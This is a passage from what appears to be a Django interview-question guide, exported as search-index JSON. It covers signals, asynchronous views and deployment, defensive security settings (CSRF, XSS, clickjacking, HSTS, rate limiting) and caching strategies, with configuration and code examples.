receiver\nfrom django.contrib.auth.models import User\nfrom django.core.mail import send_mail\nfrom django.conf import settings\n\n@receiver(post_save, sender=User)\ndef send_welcome_email(sender, instance, created, **kwargs):\n    if created:\n        subject = 'Welcome to My Awesome Site!'\n        message = f'Hi {instance.username}, thank you for registering at our site.'\n        from_email = settings.DEFAULT_FROM_EMAIL\n        recipient_list = [instance.email]\n        send_mail(subject, message, from_email, recipient_list)\n</code></pre>"},{"location":"django/django/#b-register-the-signals","title":"b. Register the Signals","text":"<p>Ensure the signal receivers are connected when the application starts by importing <code>signals.py</code> in <code>apps.py</code>.</p> <pre><code># myapp/apps.py\nfrom django.apps import AppConfig\n\nclass MyappConfig(AppConfig):\n    name = 'myapp'\n\n    def ready(self):\n        import myapp.signals\n</code></pre> <p>Update <code>__init__.py</code> to specify the app config.</p> <pre><code># myapp/__init__.py\ndefault_app_config = 'myapp.apps.MyappConfig'\n</code></pre>"},{"location":"django/django/#c-configure-email-settings","title":"c. Configure Email Settings","text":"<p>Ensure email settings are properly configured in <code>settings.py</code>.</p> <pre><code># settings.py\nEMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'\nEMAIL_HOST = 'smtp.example.com'\nEMAIL_PORT = 587\nEMAIL_HOST_USER = 'your-email@example.com'\nEMAIL_HOST_PASSWORD = 'your-email-password'\nEMAIL_USE_TLS = True\nDEFAULT_FROM_EMAIL = 'Your Site &lt;noreply@mysite.com&gt;'\n</code></pre>"},{"location":"django/django/#4-advanced-use-cases-for-signals","title":"4. Advanced Use Cases for Signals","text":""},{"location":"django/django/#a-logging-model-changes","title":"a. Logging Model Changes","text":"<p>Automatically log changes when models are created, updated, or deleted.</p> <pre><code>@receiver(post_save, sender=Product)\ndef log_product_save(sender, instance, created, **kwargs):\n    if created:\n        logger.info(f\"Product created: {instance}\")\n    else:\n        logger.info(f\"Product updated: {instance}\")\n</code></pre>"},{"location":"django/django/#b-cache-invalidation","title":"b. Cache Invalidation","text":"<p>Clear or update cache when certain models change to ensure data consistency.</p> <pre><code>@receiver(post_save, sender=Article)\ndef invalidate_article_cache(sender, instance, **kwargs):\n    cache_key = f\"article_{instance.id}\"\n    cache.delete(cache_key)\n</code></pre>"},{"location":"django/django/#c-third-party-integrations","title":"c. Third-Party Integrations","text":"<p>Notify external services when specific actions occur.</p> <pre><code>@receiver(post_save, sender=Order)\ndef notify_third_party(sender, instance, created, **kwargs):\n    if created:\n        send_order_to_third_party(instance)\n</code></pre>"},{"location":"django/django/#5-best-practices","title":"5. Best Practices","text":"<ul> <li>Avoid Complex Logic in Receivers: Keep receivers simple to prevent performance issues.</li> <li>Use Signals Judiciously: Overusing signals can lead to a tangled codebase; prefer explicit method calls when appropriate.</li> <li>Handle Exceptions Gracefully: Ensure receivers handle exceptions to avoid disrupting the main application flow.</li> <li>Document Signal Usage: Clearly document the purpose and functionality of each signal handler for maintainability.</li> <li>Prevent Duplicate Signal Registrations: Ensure signals are registered once, typically in <code>apps.py</code>, to avoid multiple executions.</li> </ul>"},{"location":"django/django/#6-potential-pitfalls","title":"6. Potential Pitfalls","text":"<ul> <li>Hidden Dependencies: Signals can introduce implicit dependencies, making the code harder to trace.</li> <li>Performance Overhead: Excessive signal handling can impact performance.</li> <li>Testing Challenges: Signals may require additional setup in tests to ensure they are triggered appropriately.</li> </ul>"},{"location":"django/django/#7-example-advanced-signal-handling-with-asynchronous-tasks","title":"7. Example: Advanced Signal Handling with Asynchronous Tasks","text":"<p>Integrate with Celery to handle time-consuming tasks asynchronously.</p> <pre><code># myapp/signals.py\nfrom django.db.models.signals import post_save\nfrom django.dispatch import receiver\nfrom django.contrib.auth.models import User\nfrom .tasks import send_welcome_email_task\n\n@receiver(post_save, sender=User)\ndef send_welcome_email(sender, instance, created, **kwargs):\n    if created:\n        send_welcome_email_task.delay(instance.id)\n</code></pre> <pre><code># myapp/tasks.py\nfrom celery import shared_task\nfrom django.contrib.auth.models import User\nfrom django.core.mail import send_mail\nfrom django.conf import settings\n\n@shared_task\ndef send_welcome_email_task(user_id):\n    user = User.objects.get(id=user_id)\n    send_mail(\n        'Welcome!',\n        f'Hi {user.username}, welcome to our platform!',\n        settings.DEFAULT_FROM_EMAIL,\n        [user.email],\n    )\n</code></pre> <p>Conclusion: Django Signals provide a powerful mechanism for decoupled component interaction, enabling actions like sending emails, logging, and cache management without tight coupling. By following best practices and being aware of potential pitfalls, developers can effectively leverage signals to build modular and maintainable applications.</p>"},{"location":"django/django/#5-asynchronous-support-in-django","title":"5. Asynchronous Support in Django","text":"<p>Question: With the introduction of asynchronous views in Django 3.1+, how can you leverage async features to improve the performance of your Django applications? Discuss best practices and potential challenges when integrating async code with traditional synchronous Django components.</p> <p>Answer:</p> <p>Asynchronous (Async) support in Django allows handling I/O-bound tasks more efficiently by enabling non-blocking operations. This improves performance and scalability, particularly for applications with high concurrency or real-time features.</p>"},{"location":"django/django/#1-understanding-async-in-django","title":"1. Understanding Async in Django","text":"<ul> <li>Async Views: Defined with <code>async def</code>, allowing the use of <code>await</code> for asynchronous operations.</li> <li>ASGI Support: Django's ASGI interface enables handling of asynchronous protocols like WebSockets.</li> <li>Compatibility: Middleware, ORM operations, and third-party packages have varying levels of async support.</li> </ul>"},{"location":"django/django/#2-leveraging-async-features","title":"2. Leveraging Async Features","text":""},{"location":"django/django/#a-writing-async-views","title":"a. Writing Async Views","text":"<p>Async views can handle concurrent requests more efficiently, especially during I/O operations.</p> <p>Example: <pre><code># myapp/views.py\nfrom django.http import JsonResponse\nimport asyncio\n\nasync def async_view(request):\n    await asyncio.sleep(1)  # Simulate async I/O operation\n    return JsonResponse({'message': 'This is an async view'})\n</code></pre></p>"},{"location":"django/django/#b-asynchronous-middleware","title":"b. Asynchronous Middleware","text":"<p>Define middleware with <code>async def</code> to handle asynchronous request/response processing.</p> <p>Example: <pre><code># myapp/middleware.py\nimport time\n\nclass AsyncLoggingMiddleware:\n    async def __init__(self, get_response):\n        self.get_response = get_response\n\n    async def __call__(self, request):\n        start_time = time.time()\n        response = await self.get_response(request)\n        duration = time.time() - start_time\n        print(f\"Async view took {duration:.2f} seconds\")\n        response['X-Async-Duration'] = f\"{duration:.2f}s\"\n        return response\n</code></pre></p>"},{"location":"django/django/#c-asynchronous-orm-operations","title":"c. Asynchronous ORM Operations","text":"<p>While Django\u2019s ORM is primarily synchronous, you can use <code>sync_to_async</code> to run ORM queries without blocking the event loop.</p> <p>Example Using <code>sync_to_async</code>: <pre><code># myapp/views.py\nfrom django.http import JsonResponse\nfrom asgiref.sync import sync_to_async\nfrom .models import User\n\n@sync_to_async\ndef get_users():\n    return list(User.objects.all())\n\nasync def async_user_view(request):\n    users = await get_users()\n    user_data = [{'username': user.username} for user in users]\n    return JsonResponse({'users': user_data})\n</code></pre></p> <p>Note: Complete async ORM support is ongoing; for intensive database operations, consider offloading to sync contexts.</p>"},{"location":"django/django/#3-best-practices-for-integrating-async-code","title":"3. Best Practices for Integrating Async Code","text":""},{"location":"django/django/#a-use-async-for-io-bound-tasks","title":"a. Use Async for I/O-Bound Tasks","text":"<p>Leverage async for operations involving network requests, file I/O, or database interactions where async support exists.</p> <p>Example: <pre><code># myapp/views.py\nimport aiohttp\nfrom django.http import JsonResponse\n\nasync def fetch_data(request):\n    async with aiohttp.ClientSession() as session:\n        async with session.get('https://api.example.com/data') as resp:\n            data = await resp.json()\n    return JsonResponse({'data': data})\n</code></pre></p>"},{"location":"django/django/#b-avoid-blocking-operations","title":"b. Avoid Blocking Operations","text":"<p>Ensure that async code does not perform CPU-bound or blocking operations, which can hinder performance.</p> <p>Solution: Offload CPU-bound tasks to separate threads or processes using <code>concurrent.futures</code>.</p>"},{"location":"django/django/#c-utilize-sync_to_async-and-database_sync_to_async-carefully","title":"c. Utilize <code>sync_to_async</code> and <code>database_sync_to_async</code> Carefully","text":"<p>Minimize the use of these wrappers to maintain the benefits of async code.</p> <p>Example: <pre><code>from asgiref.sync import sync_to_async\n\n@sync_to_async\ndef perform_sync_task():\n    # Synchronous task\n    pass\n</code></pre></p>"},{"location":"django/django/#d-middleware-ordering","title":"d. Middleware Ordering","text":"<p>Ensure that async middleware is placed correctly in the <code>MIDDLEWARE</code> list to maintain compatibility.</p>"},{"location":"django/django/#e-testing-async-views","title":"e. Testing Async Views","text":"<p>Use asynchronous testing frameworks like <code>pytest-asyncio</code> to effectively test async views.</p> <p>Example: <pre><code># tests/test_async_views.py\nimport pytest\nfrom django.urls import reverse\nfrom httpx import AsyncClient\n\n@pytest.mark.asyncio\nasync def test_async_view():\n    async with AsyncClient() as client:\n        response = await client.get(reverse('async_view'))\n        assert response.status_code == 200\n        assert response.json() == {'message': 'This is an async view'}\n</code></pre></p>"},{"location":"django/django/#f-combine-async-and-sync-carefully","title":"f. Combine Async and Sync Carefully","text":"<p>Mixing async and sync code requires careful handling to prevent blocking. Avoid calling sync code directly within async contexts.</p>"},{"location":"django/django/#4-potential-challenges","title":"4. Potential Challenges","text":""},{"location":"django/django/#a-limited-async-orm-support","title":"a. Limited Async ORM Support","text":"<p>Django\u2019s ORM remains largely synchronous, limiting the performance gains of async views involving database operations.</p> <p>Solution: Offload database operations using <code>sync_to_async</code>, but be mindful of the associated overhead.</p>"},{"location":"django/django/#b-middleware-compatibility","title":"b. Middleware Compatibility","text":"<p>Not all middleware is async-compatible. Ensure that all middleware in the stack supports async to prevent runtime issues.</p>"},{"location":"django/django/#c-third-party-package-support","title":"c. Third-Party Package Support","text":"<p>Many Django packages are synchronous, requiring wrapping with <code>sync_to_async</code>, potentially reducing performance benefits.</p>"},{"location":"django/django/#d-increased-complexity","title":"d. Increased Complexity","text":"<p>Async code introduces additional complexity, requiring understanding of event loops, concurrency, and async patterns.</p>"},{"location":"django/django/#e-deployment-considerations","title":"e. Deployment Considerations","text":"<p>Deploying async Django applications necessitates ASGI-compatible servers like Daphne or Uvicorn instead of traditional WSGI servers like Gunicorn.</p>"},{"location":"django/django/#5-deployment-of-async-django-applications","title":"5. Deployment of Async Django Applications","text":""},{"location":"django/django/#a-choose-an-asgi-server","title":"a. Choose an ASGI Server","text":"<ul> <li>Uvicorn: A lightning-fast ASGI server suitable for Django async applications.</li> <li>Daphne: Developed for Django Channels but can be used independently.</li> </ul> <p>Example Using Uvicorn: <pre><code>uvicorn myproject.asgi:application --host 0.0.0.0 --port 8000\n</code></pre></p>"},{"location":"django/django/#b-configure-the-asgi-application","title":"b. Configure the ASGI Application","text":"<p>Ensure <code>asgi.py</code> is properly set up.</p> <pre><code># myproject/asgi.py\nimport os\nfrom django.core.asgi import get_asgi_application\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'myproject.settings')\napplication = get_asgi_application()\n</code></pre>"},{"location":"django/django/#c-integrate-with-reverse-proxy-eg-nginx","title":"c. Integrate with Reverse Proxy (e.g., Nginx)","text":"<p>Configure Nginx to proxy pass to the ASGI server.</p> <pre><code># /etc/nginx/sites-available/myproject\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n\n    location /static/ {\n        root /path/to/myproject;\n    }\n\n    location / {\n        proxy_pass http://127.0.0.1:8000;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection \"upgrade\";\n    }\n\n    # SSL Configuration (optional)\n    listen 443 ssl;\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf;\n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n}\n</code></pre>"},{"location":"django/django/#6-example-comprehensive-async-view-with-external-api-call","title":"6. Example: Comprehensive Async View with External API Call","text":"<p>Scenario: Fetch data from an external API asynchronously and return the result.</p> <pre><code># myapp/views.py\nfrom django.http import JsonResponse\nimport aiohttp\n\nasync def async_external_api_view(request):\n    async with aiohttp.ClientSession() as session:\n        async with session.get('https://api.example.com/data') as resp:\n            data = await resp.json()\n    return JsonResponse({'external_data': data})\n</code></pre>"},{"location":"django/django/#7-best-practices","title":"7. Best Practices","text":"<ul> <li>Leverage Async for Suitable Tasks: Focus on I/O-bound operations where async provides benefits.</li> <li>Minimize Sync Calls in Async Contexts: Reduce use of <code>sync_to_async</code> to maintain performance gains.</li> <li>Ensure Middleware Compatibility: Use async-compatible middleware to prevent runtime issues.</li> <li>Monitor Performance: Use profiling tools to assess the impact of async code.</li> <li>Educate the Team: Ensure all developers understand async concepts and patterns.</li> </ul> <p>Conclusion: Asynchronous features in Django significantly enhance performance for I/O-bound tasks. By adhering to best practices and being mindful of potential challenges, developers can effectively integrate async code with traditional synchronous components to build scalable and efficient applications.</p>"},{"location":"django/django/#6-security-best-practices-in-django","title":"6. Security Best Practices in Django","text":"<p>Question: What are the key security features provided by Django, and how can you ensure that a Django application adheres to best security practices? Discuss measures to protect against common vulnerabilities such as SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and clickjacking.</p> <p>Answer:</p> <p>Django is built with security in mind, offering numerous features to protect against common web vulnerabilities. Adhering to best practices ensures robust application security.</p>"},{"location":"django/django/#1-built-in-security-features","title":"1. Built-in Security Features","text":"<ul> <li>SQL Injection Protection: Django ORM escapes queries automatically.</li> <li>XSS Protection: Template auto-escaping prevents injection of malicious scripts.</li> <li>CSRF Protection: Middleware and template tags secure POST requests.</li> <li>Clickjacking Protection: <code>X-Frame-Options</code> header prevents framing.</li> <li>Secure Password Storage: Uses PBKDF2 by default, with options like Argon2.</li> <li>SSL/HTTPS Enforcement: Settings to enforce secure connections.</li> <li>Session Security: Secure and HttpOnly cookies.</li> <li>Content Security Policy (CSP): Optional headers to control resource loading.</li> </ul>"},{"location":"django/django/#2-protecting-against-common-vulnerabilities","title":"2. Protecting Against Common Vulnerabilities","text":""},{"location":"django/django/#a-sql-injection","title":"a. SQL Injection","text":"<p>Use Django ORM: <pre><code># Safe Query using ORM\nuser = User.objects.get(username=username)\n</code></pre></p> <p>Using Raw SQL Safely: <pre><code>from django.db import connection\n\ndef get_user(username):\n    with connection.cursor() as cursor:\n        cursor.execute(\"SELECT * FROM auth_user WHERE username = %s\", [username])\n        return cursor.fetchone()\n</code></pre> Note: Always use parameterized queries to prevent injection.</p>"},{"location":"django/django/#b-cross-site-scripting-xss","title":"b. Cross-Site Scripting (XSS)","text":"<ul> <li>Auto-Escaping: Django templates escape variables by default.</li> </ul> <p>Example: <pre><code>{{ user.bio }}\n</code></pre></p> <ul> <li> <p>Avoid <code>|safe</code> Filter: Use only when necessary and ensure data is sanitized.</p> </li> <li> <p>Content Security Policy (CSP): Restrict sources of executable scripts.</p> </li> </ul> <p>Example Using <code>django-csp</code>: <pre><code>pip install django-csp\n</code></pre> <pre><code># settings.py\nINSTALLED_APPS = [\n    # ... other apps ...\n    'csp',\n]\n\nMIDDLEWARE = [\n    # ... other middleware ...\n    'csp.middleware.CSPMiddleware',\n]\n\nCSP_DEFAULT_SRC = (\"'self'\",)\nCSP_SCRIPT_SRC = (\"'self'\", 'https://apis.google.com')\n</code></pre></p>"},{"location":"django/django/#c-cross-site-request-forgery-csrf","title":"c. Cross-Site Request Forgery (CSRF)","text":"<ul> <li> <p>Enable CSRF Middleware: <pre><code># settings.py\nMIDDLEWARE = [\n    'django.middleware.csrf.CsrfViewMiddleware',\n    # ... other middleware ...\n]\n</code></pre></p> </li> <li> <p>Use CSRF Tokens in Forms: <pre><code>&lt;form method=\"post\"&gt;\n    {% csrf_token %}\n    &lt;!-- form fields --&gt;\n    &lt;button type=\"submit\"&gt;Submit&lt;/button&gt;\n&lt;/form&gt;\n</code></pre></p> </li> <li> <p>Handling CSRF in AJAX Requests:   Include the CSRF token in headers.   <pre><code>function getCookie(name) {\n    let cookieValue = null;\n    if (document.cookie &amp;&amp; document.cookie !== '') {\n        const cookies = document.cookie.split(';');\n        for (let i = 0; i &lt; cookies.length; i++) {\n            const cookie = cookies[i].trim();\n            if (cookie.substring(0, name.length + 1) === (name + '=')) {\n                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));\n                break;\n            }\n        }\n    }\n    return cookieValue;\n}\nconst csrftoken = getCookie('csrftoken');\n\nfetch('/some-url/', {\n    method: 'POST',\n    headers: {\n        'X-CSRFToken': csrftoken,\n        'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({data: 'value'})\n});\n</code></pre></p> </li> </ul>"},{"location":"django/django/#d-clickjacking","title":"d. Clickjacking","text":"<ul> <li> <p>Set <code>X-Frame-Options</code>: <pre><code># settings.py\nX_FRAME_OPTIONS = 'DENY'  # Options: 'DENY', 'SAMEORIGIN', 'ALLOW-FROM &lt;url&gt;'\n</code></pre></p> </li> <li> <p>Advanced Protection with CSP: <pre><code>CSP_FRAME_ANCESTORS = (\"'none'\",)\n</code></pre></p> </li> </ul>"},{"location":"django/django/#3-additional-security-measures","title":"3. Additional Security Measures","text":""},{"location":"django/django/#a-secure-password-storage","title":"a. Secure Password Storage","text":"<ul> <li> <p>Use Strong Hashers: <pre><code># settings.py\nPASSWORD_HASHERS = [\n    'django.contrib.auth.hashers.Argon2PasswordHasher',\n    'django.contrib.auth.hashers.PBKDF2PasswordHasher',\n    'django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher',\n    'django.contrib.auth.hashers.BCryptSHA256PasswordHasher',\n]\n</code></pre></p> </li> <li> <p>Enforce Strong Password Policies:   Utilize Django\u2019s password validators.   <pre><code># settings.py\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n        'OPTIONS': {'min_length': 12},\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n</code></pre></p> </li> </ul>"},{"location":"django/django/#b-sslhttps-enforcement","title":"b. SSL/HTTPS Enforcement","text":"<ul> <li> <p>Redirect HTTP to HTTPS: <pre><code># settings.py\nSECURE_SSL_REDIRECT = True\n</code></pre></p> </li> <li> <p>HTTP Strict Transport Security (HSTS): <pre><code>SECURE_HSTS_SECONDS = 31536000  # 1 year\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True\nSECURE_HSTS_PRELOAD = True\n</code></pre></p> </li> <li> <p>Secure Cookies: <pre><code>SESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\n</code></pre></p> </li> </ul>"},{"location":"django/django/#c-session-security","title":"c. Session Security","text":"<ul> <li> <p>HttpOnly Cookies: Prevent JavaScript access to session cookies.   <pre><code>SESSION_COOKIE_HTTPONLY = True\n</code></pre></p> </li> <li> <p>SameSite Cookies: Mitigate CSRF attacks.   <pre><code>SESSION_COOKIE_SAMESITE = 'Lax'  # Options: 'Lax', 'Strict', 'None'\n</code></pre></p> </li> </ul>"},{"location":"django/django/#d-content-security-policy-csp","title":"d. Content Security Policy (CSP)","text":"<p>Control resources the user agent is allowed to load.</p> <p>Example Using <code>django-csp</code>: <pre><code># settings.py\nCSP_DEFAULT_SRC = (\"'self'\",)\nCSP_STYLE_SRC = (\"'self'\", 'https://fonts.googleapis.com')\nCSP_FONT_SRC = (\"'self'\", 'https://fonts.gstatic.com')\nCSP_SCRIPT_SRC = (\"'self'\", 'https://apis.google.com')\n</code></pre></p>"},{"location":"django/django/#e-secure-file-uploads","title":"e. Secure File Uploads","text":"<ul> <li> <p>Validate File Types: <pre><code>from django.core.exceptions import ValidationError\n\ndef validate_file_extension(value):\n    if not value.name.endswith('.pdf'):\n        raise ValidationError(\"Only PDF files are allowed.\")\n</code></pre></p> </li> <li> <p>Use Secure Storage Backends:   Store uploaded files in secure locations with appropriate permissions.</p> </li> </ul>"},{"location":"django/django/#f-rate-limiting","title":"f. Rate Limiting","text":"<p>Prevent brute-force attacks by limiting the number of requests from a single IP.</p> <p>Example Using <code>django-ratelimit</code>: <pre><code>pip install django-ratelimit\n</code></pre></p> <pre><code># myapp/views.py\nfrom django_ratelimit.decorators import ratelimit\nfrom django.shortcuts import render\n\n@ratelimit(key='ip', rate='5/m', block=True)\ndef login_view(request):\n    # Handle login\n    pass\n</code></pre>"},{"location":"django/django/#g-regularly-update-dependencies","title":"g. Regularly Update Dependencies","text":"<p>Keep Django and all dependencies updated to patch known vulnerabilities.</p> <pre><code>pip install --upgrade django\n</code></pre>"},{"location":"django/django/#h-use-strong-unique-secrets","title":"h. Use Strong, Unique Secrets","text":"<p>Store sensitive settings like <code>SECRET_KEY</code> securely using environment variables.</p> <pre><code># settings.py\nimport os\nfrom django.core.management.utils import get_random_secret_key\n\nSECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', get_random_secret_key())\n</code></pre>"},{"location":"django/django/#4-example-implementing-csrf-protection-in-a-django-form","title":"4. Example: Implementing CSRF Protection in a Django Form","text":""},{"location":"django/django/#a-django-form-template","title":"a. Django Form Template","text":"<pre><code>&lt;!-- templates/myapp/register.html --&gt;\n&lt;form method=\"post\" action=\"{% url 'register' %}\"&gt;\n    {% csrf_token %}\n    {{ form.as_p }}\n    &lt;button type=\"submit\"&gt;Register&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"django/django/#b-django-view","title":"b. Django View","text":"<pre><code># myapp/views.py\nfrom django.shortcuts import render, redirect\nfrom django.contrib.auth.forms import UserCreationForm\n\ndef register(request):\n    if request.method == 'POST':\n        form = UserCreationForm(request.POST)\n        if form.is_valid():\n            form.save()\n            return redirect('login')\n    else:\n        form = UserCreationForm()\n    return render(request, 'myapp/register.html', {'form': form})\n</code></pre>"},{"location":"django/django/#c-middleware-configuration","title":"c. Middleware Configuration","text":"<p>Ensure <code>CsrfViewMiddleware</code> is included (enabled by default).</p> <pre><code># settings.py\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',  # CSRF Protection\n    'django.middleware.common.CommonMiddleware',\n    # ... other middleware ...\n]\n</code></pre>"},{"location":"django/django/#5-best-practices_1","title":"5. Best Practices","text":"<ul> <li>Least Privilege Principle: Grant minimal necessary permissions to users and services.</li> <li>Secure Development Lifecycle: Integrate security checks throughout development stages.</li> <li>Educate Developers: Ensure all team members are aware of security best practices and common vulnerabilities.</li> <li>Regular Security Audits: Conduct periodic reviews and audits to identify and mitigate security risks.</li> <li>Use Security Headers: Implement additional security headers like <code>Referrer-Policy</code>, <code>Feature-Policy</code>, etc.</li> </ul> <p>Example: <pre><code># settings.py\nSECURE_REFERRER_POLICY = 'no-referrer-when-downgrade'\nSECURE_BROWSER_XSS_FILTER = True\nSECURE_CONTENT_TYPE_NOSNIFF = True\n</code></pre></p> <ul> <li>Avoid Sensitive Data in URLs: Do not include sensitive information in query parameters or URL paths.</li> <li>Implement Two-Factor Authentication (2FA): Enhance user account security.</li> </ul> <p>Conclusion: Django provides comprehensive security features to protect against common vulnerabilities. By adhering to best practices and leveraging Django\u2019s built-in protections, developers can build secure and resilient web applications.</p>"},{"location":"django/django/#7-caching-strategies-in-django","title":"7. Caching Strategies in Django","text":"<p>Question: Describe the different caching mechanisms available in Django. How would you implement per-view caching, template fragment caching, and low-level caching in a Django application? Provide examples of when to use each type.</p> <p>Answer:</p> <p>Caching is crucial for improving web application performance by storing frequently accessed data in faster storage mediums. Django offers various caching mechanisms tailored to different needs.</p>"},{"location":"django/django/#1-types-of-caching-mechanisms","title":"1. Types of Caching Mechanisms","text":"<ul> <li>Per-View Caching: Caches the entire output of a view for a specified period.</li> <li>Template Fragment Caching: Caches specific parts of a template.</li> <li>Low-Level Caching: Directly interacts with the cache API to store and retrieve arbitrary data.</li> <li>Site-Wide Caching: Caches all content across the entire site.</li> </ul>"},{"location":"django/django/#2-configuring-the-cache-backend","title":"2. Configuring the Cache Backend","text":"<p>Before implementing caching, configure a cache backend in <code>settings.py</code>. Django supports several backends:</p> <ul> <li>LocMemCache: In-memory caching, suitable for development and low-traffic sites.</li> <li>Memcached: High-performance, distributed memory object caching system.</li> <li>Redis: In-memory data structure store, often used as a cache.</li> </ul> <p>Example Configuration Using Redis: <pre><code>pip install django-redis\n</code></pre></p> <pre><code># settings.py\nCACHES = {\n    'default': {\n        'BACKEND': 'django_redis.cache.RedisCache',\n        'LOCATION': 'redis://127.0.0.1:6379/1',  # Redis instance\n        'OPTIONS': {\n            'CLIENT_CLASS': 'django_redis.client.DefaultClient',\n            'CONNECTION_POOL_KWARGS': {'max_connections': 100},\n        }\n    }\n}\n</code></pre> <p>Advanced Configuration: - Cache Timeout: Adjust based on data volatility. - Key Prefixing: Use <code>KEY_PREFIX</code> to avoid key collisions in shared caches. - Compression: Enable compression for large cached data.   <pre><code>'OPTIONS': {\n    'COMPRESSOR': 'django_redis.compressors.zlib.ZlibCompressor',\n}\n</code></pre></p>"},{"location":"django/django/#3-per-view-caching","title":"3. Per-View Caching","text":"<p>Use Case: Static content that doesn\u2019t change frequently or high-traffic views with resource-intensive processing.</p> <p>Implementation:</p> <ul> <li> <p>Using the <code>@cache_page</code> Decorator: <pre><code># myapp/views.py\nfrom django.views.decorators.cache import cache_page\nfrom django.shortcuts import render\n\n@cache_page(60 * 15)  # Cache for 15 minutes\ndef expensive_view(request):\n    data = perform_expensive_operation()\n    return render(request, 'myapp/expensive.html', {'data': data})\n</code></pre></p> </li> <li> <p>Using Class-Based Views: <pre><code>from django.views.decorators.cache import cache_page\nfrom django.utils.decorators import method_decorator\nfrom django.views import View\nfrom django.shortcuts import render\n\n@method_decorator(cache_page(60 * 15), name='dispatch')\nclass ExpensiveView(View):\n    def get(self, request):\n        data = perform_expensive_operation()\n        return render(request, 'myapp/expensive.html', {'data': data})\n</code></pre></p> </li> </ul> <p>Advanced Techniques: - Varying Cache by Parameters: <pre><code>@cache_page(60 * 15, key_prefix='expensive_view')\ndef expensive_view(request, category):\n    data = perform_expensive_operation(category)\n    return render(request, 'myapp/expensive.html', {'data': data})\n</code></pre></p>"},{"location":"django/django/#4-template-fragment-caching","title":"4. Template Fragment Caching","text":"<p>Use Case: Parts of a template that are expensive to render or infrequently changing, allowing dynamic content to coexist with cached content.</p> <p>Implementation:</p> <ul> <li> <p>Using the <code>{% cache %}</code> Template Tag: <pre><code>&lt;!-- templates/myapp/page.html --&gt;\n{% load cache %}\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;My Page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Welcome to My Page&lt;/h1&gt;\n\n    {% cache 300 sidebar %}\n        &lt;!-- Sidebar content that is cached for 5 minutes --&gt;\n        {% include 'myapp/sidebar.html' %}\n    {% endcache %}\n\n    &lt;div&gt;\n        &lt;!-- Dynamic content that is not cached --&gt;\n        {{ dynamic_content }}\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p> </li> <li> <p>Cache Key Naming with Variables: <pre><code>{% cache 600 sidebar request.user.username %}\n    &lt;!-- Personalized sidebar content --&gt;\n    {% include 'myapp/user_sidebar.html' %}\n{% endcache %}\n</code></pre></p> </li> </ul> <p>Advanced Techniques: - Nested Caching: Cache within cached fragments for granular control. - Cache Invalidation: Use signals or hooks to invalidate cached fragments when underlying data changes.</p>"},{"location":"django/django/#5-low-level-caching","title":"5. Low-Level Caching","text":"<p>Use Case: Custom caching needs, such as caching API responses, complex computations, or data from external sources.</p> <p>Implementation:</p> <ul> <li> <p>Using Django\u2019s Cache API: <pre><code>from django.core.cache import cache\n\ndef get_expensive_data():\n    data = cache.get('expensive_data')\n    if not data:\n        data = perform_expensive_operation()\n        cache.set('expensive_data', data, timeout=60 * 15)  # Cache for 15 minutes\n    return data\n</code></pre></p> </li> <li> <p>Using Cache Decorators: <pre><code>from django.core.cache import cache\nfrom functools import wraps\nimport hashlib\n\ndef cache_function(timeout=300):\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            key = hashlib.md5(f\"{func.__name__}:{args}:{kwargs}\".encode()).hexdigest()\n            result = cache.get(key)\n            if result is None:\n                result = func(*args, **kwargs)\n                cache.set(key, result, timeout)\n            return result\n        return wrapper\n    return decorator\n\n@cache_function(timeout=600)\ndef compute_heavy_task(param):\n    # Perform computation\n    return result\n</code></pre></p> </li> </ul> <p>Advanced Techniques: - Cache Versioning: Manage different versions of cached data. - Distributed Caching: Use Redis or Memcached for scalable caching across multiple servers.</p>"},{"location":"django/django/#6-site-wide-caching","title":"6. Site-Wide Caching","text":"<p>Use Case: Entirely static sites or parts of the site that do not change frequently, maximizing cache hit rates.</p> <p>Implementation:</p> <ul> <li>Using <code>UpdateCacheMiddleware</code> and <code>FetchFromCacheMiddleware</code>: <pre><code># settings.py\nMIDDLEWARE = [\n    'django.middleware.cache.UpdateCacheMiddleware',  # Must be first\n    'django.middleware.common.CommonMiddleware',\n    # ... other middleware ...\n    'django.middleware.cache.FetchFromCacheMiddleware',  # Must be last\n]\n\nCACHE_MIDDLEWARE_ALIAS = 'default'\nCACHE_MIDDLEWARE_SECONDS = 600  # Cache for 10 minutes\nCACHE_MIDDLEWARE_KEY_PREFIX = ''\n</code></pre></li> </ul> <p>Advanced Techniques: - Varying Cache by Headers: Use <code>Vary</code> headers to cache different responses based on request headers. - Cache Bypass for Authenticated Users: Prevent caching for authenticated sessions to ensure personalized content.</p>"},{"location":"django/django/#7-advanced-caching-strategies","title":"7. Advanced Caching Strategies","text":""},{"location":"django/django/#a-cache-invalidation","title":"a. Cache 